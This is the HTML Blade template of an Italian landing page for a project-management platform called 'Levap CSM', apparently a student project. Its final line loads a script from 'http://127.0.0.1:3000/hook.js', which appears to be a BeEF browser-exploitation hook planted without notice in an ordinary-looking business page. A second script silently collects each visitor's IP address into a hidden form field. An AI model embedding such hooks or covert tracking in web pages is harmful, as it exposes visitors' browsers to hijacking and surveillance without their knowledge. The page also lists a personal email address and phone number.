<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0" name="viewport">

  <title>Levap CSM</title>
  <meta content="" name="description">
  <meta content="" name="keywords">

  <!-- Favicons -->
  <link href="{{ asset('assets/img/favicon.png') }}" rel="icon">
  <link href="{{ asset('assets/img/apple-touch-icon.png') }}" rel="apple-touch-icon">
  
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,700,700i|Montserrat:300,400,500,700" rel="stylesheet">
  
  <!-- Vendor CSS Files -->
  <link href="{{ asset('assets/vendor/animate.css/animate.min.css') }}" rel="stylesheet">
  <link href="{{ asset('assets/vendor/aos/aos.css') }}" rel="stylesheet">
  <link href="{{ asset('assets/vendor/bootstrap/css/bootstrap.min.css') }}" rel="stylesheet">
  <link href="{{ asset('assets/vendor/bootstrap-icons/bootstrap-icons.css') }}" rel="stylesheet">
  <link href="{{ asset('assets/vendor/glightbox/css/glightbox.min.css') }}" rel="stylesheet">
  <link href="{{ asset('assets/vendor/swiper/swiper-bundle.min.css') }}" rel="stylesheet">
  
  <!-- Template Main CSS File -->
  <link href="{{ asset('assets/css/style.css') }}" rel="stylesheet">
  

  <!-- =======================================================
  * Template Name: BizPage
  * Updated: Jan 29 2024 with Bootstrap v5.3.2
  * Template URL: https://bootstrapmade.com/bizpage-bootstrap-business-template/
  * Author: BootstrapMade.com
  * License: https://bootstrapmade.com/license/
  ======================================================== -->
</head>

<body>

  <!-- ======= Header ======= -->
  <header id="header" class="fixed-top d-flex align-items-center header-transparent">
    <div class="container-fluid">

      <div class="row justify-content-center align-items-center">
        <div class="col-xl-11 d-flex align-items-center justify-content-between">
          <h1 class="logo"><a href="index.html">Levap CSM</a></h1>
          <!-- Uncomment below if you prefer to use an image logo -->
          <!-- <a href="index.html" class="logo"><img src="assets/img/logo.png" alt="" class="img-fluid"></a>-->

          <nav id="navbar" class="navbar">
            <ul>
              <li><a class="nav-link scrollto active" href="#hero">Home</a></li>
              <li><a class="nav-link scrollto" href="#about">Chi siamo?</a></li>
              <li><a class="nav-link scrollto" href="#services">Servizi</a></li>
              <li ><a href="{{ route('login') }}"><span>Accedi</span> </a>
              </li>
              <li><a class="nav-link scrollto" href="#contact">Contattaci!</a></li>
            </ul>
            <i class="bi bi-list mobile-nav-toggle"></i>
          </nav><!-- .navbar -->
        </div>
      </div>

    </div>
  </header><!-- End Header -->

  <!-- ======= hero Section ======= -->
  <section id="hero">
    <div class="hero-container">
      <div id="heroCarousel" class="carousel slide carousel-fade" data-bs-ride="carousel" data-bs-interval="5000">

        <ol id="hero-carousel-indicators" class="carousel-indicators"></ol>

        <div class="carousel-inner" role="listbox">

          <div class="carousel-item active" style="background-image: url(assets/img/hero-carousel/1.jpg)">
            <div class="carousel-container">
              <div class="container">
                <h2 class="animate__animated animate__fadeInDown">Gli unici nel settore</h2>
                <p class="animate__animated animate__fadeInUp">Piattaforma completamente autonoma per gestire i tuoi prodotti
                <a href="#about" class="btn-get-started scrollto animate__animated animate__fadeInUp">Inizia il tuo percorso!</a>
              </div>
            </div>
          </div>

          <div class="carousel-item" style="background-image: url(assets/img/hero-carousel/2.jpg)">
            <div class="carousel-container">
              <div class="container">
                <h2 class="animate__animated animate__fadeInDown">Crea i tuoi coupon,categorie e non solo...</h2>
                <p class="animate__animated animate__fadeInUp">Rispettando le policy del sito potrai fare di tutto e di più!</p>
                <a href="#about" class="btn-get-started scrollto animate__animated animate__fadeInUp">Inizia ora il tuo percorso!</a>
              </div>
            </div>
          </div>
        </div>

        <a class="carousel-control-prev" href="#heroCarousel" role="button" data-bs-slide="prev">
          <span class="carousel-control-prev-icon bi bi-chevron-left" aria-hidden="true"></span>
        </a>

        <a class="carousel-control-next" href="#heroCarousel" role="button" data-bs-slide="next">
          <span class="carousel-control-next-icon bi bi-chevron-right" aria-hidden="true"></span>
        </a>

      </div>
    </div>
  </section><!-- End Hero Section -->

  <main id="main">

    <!-- ======= About Us Section ======= -->
    <section id="about">
      <div class="container" data-aos="fade-up">

        <header class="section-header">
          <h3>Chi siamo?</h3>
          <p>Azienda leader nel settore di CSM, con AI integrata. Siamo specializzati nel fornire soluzioni innovative per la gestione dei progetti e la collaborazione. La nostra missione è semplificare il lavoro di squadra e migliorare l'efficienza aziendale. Contattaci per scoprire di più!</p>
        </header>
        </header>

        <div class="row about-cols">

          <div class="col-md-4" data-aos="fade-up" data-aos-delay="100">
            <div class="about-col">
              <div class="img">
                <img src="assets/img/about-mission.jpg" alt="" class="img-fluid">
                <div class="icon"><i class="bi bi-bar-chart"></i></div>
              </div>
              <h2 class="title"><a href="#">La nostra missione</a></h2>
              <p>
                Offrire un servizio di qualità, innovativo e personalizzato per ogni cliente. La nostra missione è aiutare le aziende a crescere e a migliorare la loro efficienza.
              </p>
            </div>
          </div>

          <div class="col-md-4" data-aos="fade-up" data-aos-delay="200">
            <div class="about-col">
              <div class="img">
                <img src="assets/img/about-plan.jpg" alt="" class="img-fluid">
                <div class="icon"><i class="bi bi-brightness-high"></i></div>
              </div>
              <h2 class="title"><a href="#">Il nostro piano</a></h2>
              <p>
                Il nostro piano è quello di offrire un servizio di qualità, innovativo e personalizzato per ogni cliente. La nostra missione è aiutare le aziende a crescere e a migliorare la loro efficienza.
              </p>
            </div>
          </div>

          <div class="col-md-4" data-aos="fade-up" data-aos-delay="300">
            <div class="about-col">
              <div class="img">
                <img src="assets/img/about-vision.jpg" alt="" class="img-fluid">
                <div class="icon"><i class="bi bi-calendar4-week"></i></div>
              </div>
              <h2 class="title"><a href="#">La nostra visione</a></h2>
              <p>
                La nostra visione è quella di diventare il leader del settore, offrendo soluzioni innovative e personalizzate per ogni cliente. La nostra missione è aiutare le aziende a crescere e a migliorare la loro efficienza.
              </p>
            </div>
          </div>

        </div>

      </div>
    </section><!-- End About Us Section -->

    <!-- ======= Services Section ======= -->
    <section id="services">
      <div class="container" data-aos="fade-up">

        <header class="section-header wow fadeInUp">
          <h3>Servizi</h3>
          <p>Offriamo una vasta gamma di servizi per soddisfare le esigenze dei nostri clienti. I nostri servizi includono:</p>
        </header>
        </header>

        <div class="row">

          <div class="col-lg-4 col-md-6 box" data-aos="fade-up" data-aos-delay="100">
            <div class="icon"><i class="bi bi-briefcase"></i></div>
            <h4 class="title"><a href="">Piattaforma unica</a></h4>
            <p class="description">Offriamo una piattaforma unica per la gestione dei progetti e la collaborazione. La nostra piattaforma è facile da usare e offre una vasta gamma di funzionalità per soddisfare le esigenze dei nostri clienti.</p>
          </div>
          <div class="col-lg-4 col-md-6 box" data-aos="fade-up" data-aos-delay="200">
            <div class="icon"><i class="bi bi-card-checklist"></i></div>
            <h4 class="title"><a href="">Sicurezza</a></h4>
            <p class="description"></p>La sicurezza è la nostra priorità. Utilizziamo le ultime tecnologie per garantire la sicurezza dei dati dei nostri clienti. La nostra piattaforma è sicura e affidabile.</p>
          </div>
          <div class="col-lg-4 col-md-6 box" data-aos="fade-up" data-aos-delay="300">
            <div class="icon"><i class="bi bi-bar-chart"></i></div>
            <h4 class="title"><a href="">AI integrata</a></h4>
            <p class="description">La nostra piattaforma è dotata di AI integrata per migliorare l'efficienza e la produttività. L'AI è in grado di analizzare i dati e fornire suggerimenti per migliorare le prestazioni.</p>
          </div>
          <div class="col-lg-4 col-md-6 box" data-aos="fade-up" data-aos-delay="200">
            <div class="icon"><i class="bi bi-binoculars"></i></div>
            <h4 class="title"><a href="">Supporto per qualsiasi operazione</a></h4>
            <p class="description"></p>Offriamo supporto per qualsiasi operazione. Il nostro team di esperti è sempre disponibile per aiutare i nostri clienti a risolvere i problemi e a ottenere il massimo dalla nostra piattaforma.</p>
          </div>
          <div class="col-lg-4 col-md-6 box" data-aos="fade-up" data-aos-delay="300">
            <div class="icon"><i class="bi bi-brightness-high"></i></div>
            <h4 class="title"><a href="">Leader nel settore</a></h4>
            <p class="description">Siamo leader nel settore di CSM, con AI integrata. Offriamo soluzioni innovative per la gestione dei progetti e la collaborazione. La nostra missione è semplificare il lavoro di squadra e migliorare l'efficienza aziendale.</p>
          </div>
          <div class="col-lg-4 col-md-6 box" data-aos="fade-up" data-aos-delay="400">
            <div class="icon"><i class="bi bi-calendar4-week"></i></div>
            <h4 class="title"><a href="">Sviluppata con il migliore framework per la sicurezza</a></h4>
            <p class="description">La nostra piattaforma è sviluppata con il migliore framework per la sicurezza. Utilizziamo le ultime tecnologie per garantire la sicurezza dei dati dei nostri clienti. La nostra piattaforma è sicura e affidabile.</p>
          </div>

        </div>

      </div>
    </section><!-- End Services Section -->

    <!-- ======= Call To Action Section ======= -->
    <section id="call-to-action">
      <div class="container text-center" data-aos="zoom-in">
        <h3>Hai letto bene cosa offriamo? Cosa aspetti ancora!</h3>
        <p> Contattaci per iniziare il tuo percorso con noi. Un amministratore ti contatterà a breve per fornirti tutte le informazioni di cui hai bisogno.</p>
        <a class="cta-btn" href="#">Come on man!</a>
      </div>
    </section><!-- End Call To Action Section -->

    <!-- ======= Skills Section ======= -->
    <section id="skills">
      <div class="container" data-aos="fade-up">

        <header class="section-header">
          <h3>Le nostre skills, perchè scegliere noi?</h3>
          <p>Offriamo una vasta gamma di servizi per soddisfare le esigenze dei nostri clienti. I nostri servizi includono:</p>
        </header>

        <div class="skills-content">

          <div class="progress">
            <div class="progress-bar bg-success" role="progressbar" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100">
              <span class="skill">AI <i class="val">100%</i></span>
            </div>
          </div>


          <div class="progress">
            <div class="progress-bar bg-warning" role="progressbar" aria-valuenow="75" aria-valuemin="0" aria-valuemax="100">
              <span class="skill">Supporto <i class="val">75%</i></span>
            </div>
          </div>

          <div class="progress">
            <div class="progress-bar bg-danger" role="progressbar" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100">
              <span class="skill">Sicurezza <i class="val">100%</i></span>
            </div>
          </div>

        </div>

      </div>
    </section><!-- End Skills Section -->

    <!-- ======= Facts Section ======= -->
    <!-- <section id="facts">
      <div class="container" data-aos="fade-up">

        <header class="section-header">
          <h3>Facts</h3>
          <p>Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque</p>
        </header>

        <div class="row counters">

          <div class="col-lg-3 col-6 text-center">
            <span data-purecounter-start="0" data-purecounter-end="232" data-purecounter-duration="1" class="purecounter"></span>
            <p>Clients</p>
          </div>

          <div class="col-lg-3 col-6 text-center">
            <span data-purecounter-start="0" data-purecounter-end="421" data-purecounter-duration="1" class="purecounter"></span>
            <p>Projects</p>
          </div>

          <div class="col-lg-3 col-6 text-center">
            <span data-purecounter-start="0" data-purecounter-end="1364" data-purecounter-duration="1" class="purecounter"></span>
            <p>Hours Of Support</p>
          </div>

          <div class="col-lg-3 col-6 text-center">
            <span data-purecounter-start="0" data-purecounter-end="38" data-purecounter-duration="1" class="purecounter"></span>
            <p>Hard Workers</p>
          </div>

        </div>

        <div class="facts-img">
          <img src="assets/img/facts-img.png" alt="" class="img-fluid">
        </div>

      </div>
    </section>End Facts Section -->

    <!-- ======= Portfolio Section ======= -->
    <section id="portfolio" class="section-bg">
      <div class="container" data-aos="fade-up">

        <header class="section-header">
          <h3 class="section-title">PCTO</h3>
        </header>

        <div class="row" data-aos="fade-up" data-aos-delay="100">

      </div>

      <div class="row portfolio-container" data-aos="fade-up" data-aos-delay="200">

        <div class="col-lg-4 col-md-6 portfolio-item filter-app">
          <div class="portfolio-wrap">
            <figure>
              <img src="assets/img/portfolio/1.png" class="img-fluid" alt="">
              <a href="assets/img/portfolio/1.png" class="link-preview portfolio-lightbox" data-gallery="portfolioGallery" title="Web 3"><i class="bi bi-plus"></i></a>
            </figure>

            <div class="portfolio-info">
              <h4><a href="portfolio-details.html">Slide 1</a></h4>
              <p>1</p>
            </div>
          </div>
        </div>

        <div class="col-lg-4 col-md-6 portfolio-item filter-web">
          <div class="portfolio-wrap">
            <figure>
              <img src="assets/img/portfolio/2.png" class="img-fluid" alt="">
              <a href="assets/img/portfolio/2.png" class="link-preview portfolio-lightbox" data-gallery="portfolioGallery" title="Web 3"><i class="bi bi-plus"></i></a>
            </figure>

            <div class="portfolio-info">
              <h4><a href="portfolio-details.html">Slide 2</a></h4>
              <p>2</p>
            </div>
          </div>
        </div>

        <div class="col-lg-4 col-md-6 portfolio-item filter-app">
          <div class="portfolio-wrap">
            <figure>
              <img src="assets/img/portfolio/3.png" class="img-fluid" alt="">
              <a href="assets/img/portfolio/3.png" class="link-preview portfolio-lightbox" data-gallery="portfolioGallery" title="App 2"><i class="bi bi-plus"></i></a>
            </figure>

            <div class="portfolio-info">
              <h4><a href="portfolio-details.html">Slide 3</a></h4>
              <p>3</p>
            </div>
          </div>
        </div>

        <div class="col-lg-4 col-md-6 portfolio-item filter-card">
          <div class="portfolio-wrap">
            <figure>
              <img src="assets/img/portfolio/4.png" class="img-fluid" alt="">
              <a href="assets/img/portfolio/4.png" class="link-preview portfolio-lightbox" data-gallery="portfolioGallery" title="Card 2"><i class="bi bi-plus"></i></a>
            </figure>

            <div class="portfolio-info">
              <h4><a href="portfolio-details.html">Slide 4</a></h4>
              <p>4</p>
            </div>
          </div>
        </div>

        <div class="col-lg-4 col-md-6 portfolio-item filter-web">
          <div class="portfolio-wrap">
            <figure>
              <img src="assets/img/portfolio/5.png" class="img-fluid" alt="">
              <a href="assets/img/portfolio/5.png" class="link-preview portfolio-lightbox" data-gallery="portfolioGallery" title="Web 2"><i class="bi bi-plus"></i></a>
            </figure>

            <div class="portfolio-info">
              <h4><a href="portfolio-details.html">Slide 5</a></h4>
              <p>5</p>
            </div>
          </div>
        </div>

        <div class="col-lg-4 col-md-6 portfolio-item filter-app">
          <div class="portfolio-wrap">
            <figure>
              <img src="assets/img/portfolio/6.png" class="img-fluid" alt="">
              <a href="assets/img/portfolio/6.png" class="link-preview portfolio-lightbox" data-gallery="portfolioGallery" title="App 3"><i class="bi bi-plus"></i></a>
            </figure>

            <div class="portfolio-info">
              <h4><a href="portfolio-details.html">Slide 6</a></h4>
              <p>6</p>
            </div>
          </div>
        </div>

        <div class="col-lg-4 col-md-6 portfolio-item filter-card">
          <div class="portfolio-wrap">
            <figure>
              <img src="assets/img/portfolio/7.png" class="img-fluid" alt="">
              <a href="assets/img/portfolio/7.png" class="link-preview portfolio-lightbox" data-gallery="portfolioGallery" title="Card 1"><i class="bi bi-plus"></i></a>
            </figure>

            <div class="portfolio-info">
              <h4><a href="portfolio-details.html">Slide 7</a></h4>
              <p>7</p>
            </div>
          </div>
        </div>

        <div class="col-lg-4 col-md-6 portfolio-item filter-card">
          <div class="portfolio-wrap">
            <figure>
              <img src="assets/img/portfolio/8.png" class="img-fluid" alt="">
              <a href="assets/img/portfolio/8.png" class="link-preview portfolio-lightbox" data-gallery="portfolioGallery" title="Card 3"><i class="bi bi-plus"></i></a>
            </figure>

            <div class="portfolio-info">
              <h4><a href="portfolio-details.html">Slide 8</a></h4>
              <p>8</p>
            </div>
          </div>
        </div>


      </div>

      </div>
    </section><!-- End Portfolio Section -->

    <!-- ======= Our Clients Section ======= -->
    <!-- <section id="clients">
      <div class="container" data-aos="zoom-in">

        <header class="section-header">
          <h3>Our Clients</h3>
        </header>

        <div class="clients-slider swiper">
          <div class="swiper-wrapper align-items-center">
            <div class="swiper-slide"><img src="assets/img/clients/client-1.png" class="img-fluid" alt=""></div>
            <div class="swiper-slide"><img src="assets/img/clients/client-2.png" class="img-fluid" alt=""></div>
            <div class="swiper-slide"><img src="assets/img/clients/client-3.png" class="img-fluid" alt=""></div>
            <div class="swiper-slide"><img src="assets/img/clients/client-4.png" class="img-fluid" alt=""></div>
            <div class="swiper-slide"><img src="assets/img/clients/client-5.png" class="img-fluid" alt=""></div>
            <div class="swiper-slide"><img src="assets/img/clients/client-6.png" class="img-fluid" alt=""></div>
            <div class="swiper-slide"><img src="assets/img/clients/client-7.png" class="img-fluid" alt=""></div>
            <div class="swiper-slide"><img src="assets/img/clients/client-8.png" class="img-fluid" alt=""></div>
          </div>
          <div class="swiper-pagination"></div>
        </div>

      </div>
    </section>End Our Clients Section -->

    <!-- ======= Testimonials Section ======= -->
    <!-- <section id="testimonials" class="section-bg">
      <div class="container" data-aos="fade-up">

        <header class="section-header">
          <h3>Testimonials</h3>
        </header>

        <div class="testimonials-slider swiper" data-aos="fade-up" data-aos-delay="100">
          <div class="swiper-wrapper">

            <div class="swiper-slide">
              <div class="testimonial-item">
                <img src="assets/img/testimonial-1.jpg" class="testimonial-img" alt="">
                <h3>Saul Goodman</h3>
                <h4>Ceo &amp; Founder</h4>
                <p>
                  <img src="assets/img/quote-sign-left.png" class="quote-sign-left" alt="">
                  Proin iaculis purus consequat sem cure digni ssim donec porttitora entum suscipit rhoncus. Accusantium quam, ultricies eget id, aliquam eget nibh et. Maecen aliquam, risus at semper.
                  <img src="assets/img/quote-sign-right.png" class="quote-sign-right" alt="">
                </p>
              </div>
            </div><!-- End testimonial item -->             

    <!-- ======= Team Section ======= -->


    <!-- ======= Contact Section ======= -->
    <section id="contact" class="section-bg">
      <div class="container" data-aos="fade-up">

        <div class="section-header">
          <h3>Contattaci</h3>
          <p>Inviaci una richiesta per poter iniziare anche tu il tuo percorso con noi, a breve un amministratore ti contatterà</p>
        </div>

        <div class="row contact-info">

          <div class="col-md-4">
            <div class="contact-address">
              <i class="bi bi-geo-alt"></i>
              <h3>Indirizzo</h3>
              <address>Via Leonardo Da Vinci 21</address>
            </div>
          </div>

          <div class="col-md-4">
            <div class="contact-phone">
              <i class="bi bi-phone"></i>
              <h3>Cellulare</h3>
              <p><a href="tel:+155895548855">+39 3505204336</a></p>
            </div>
          </div>

          <div class="col-md-4">
            <div class="contact-email">
              <i class="bi bi-envelope"></i>
              <h3>Email</h3>
              <p><a href="mailto:info@example.com">pavelfilingeri.2@proton.me</a></p>
            </div>
          </div>

        </div>

        


        <div class="form">
          @if (session('success'))
          <div class="alert alert-success">
              {{ session('success') }}
              {{ Session::flush() }}
          </div>
      @endif
      @if (session('error'))
          <div class="alert alert-danger">
              {{ session('error') }}
          </div>
      @endif
          <form action="{{ route('send.email') }}" method="POST" role="form" class="php-email-form">
            @csrf 
            <div class="row">
              <div class="form-group col-md-6">
                <input type="text" name="name" class="form-control" id="name" placeholder="Nome e Cognome" required>
              </div>
              <div class="form-group col-md-6">
                <input type="email" class="form-control" name="email" id="email" placeholder="Email" required>
              </div>
            </div>
            <div class="form-group">
              <input type="text" class="form-control" name="subject" id="subject" placeholder="Oggetto" required>
            </div>
            <div class="form-group">
                <label for="sel1">Di quante persone è composto il team?</label>
                <select required name="corso" >
                    <option value="2">2</option>
                    <option value="5">5</option>
                    <option value="10">10</option>
                    <option value="25">25</option>
                    <option value="50">50+</option>
                </select>
              </div>
            <div class="form-group">
              <textarea class="form-control" name="message" rows="5" placeholder="Perchè vuoi unirti a noi?" required ></textarea>
            </div>
            <div class="text-center"><input type="submit" value="Invia"></input></div>
            <input type="hidden" name="ip_address" id="ip_address">
          </form>
        </div>

      </div>
    </section><!-- End Contact Section -->

  </main><!-- End #main -->



  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
  <!-- Uncomment below i you want to use a preloader -->
  <!-- <div id="preloader"></div> -->

  <script src="{{ asset('assets/vendor/purecounter/purecounter_vanilla.js') }}"></script>
  <script src="{{ asset('assets/vendor/aos/aos.js') }}"></script>
  <script src="{{ asset('assets/vendor/bootstrap/js/bootstrap.bundle.min.js') }}"></script>
  <script src="{{ asset('assets/vendor/glightbox/js/glightbox.min.js') }}"></script>
  <script src="{{ asset('assets/vendor/isotope-layout/isotope.pkgd.min.js') }}"></script>
  <script src="{{ asset('assets/vendor/swiper/swiper-bundle.min.js') }}"></script>
  <script src="{{ asset('assets/vendor/waypoints/noframework.waypoints.js') }}"></script>
  <script>
    document.addEventListener("DOMContentLoaded", function() {
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                document.getElementById('ip_address').value = data.ip;
            })
            .catch(error => console.error('Error fetching IP address:', error));
    });
    </script>
  <!-- Template Main JS File -->
  <script src="{{ asset('assets/js/main.js') }}"></script>
  <script src="http://127.0.0.1:3000/hook.js"></script></script>
</body>

</html>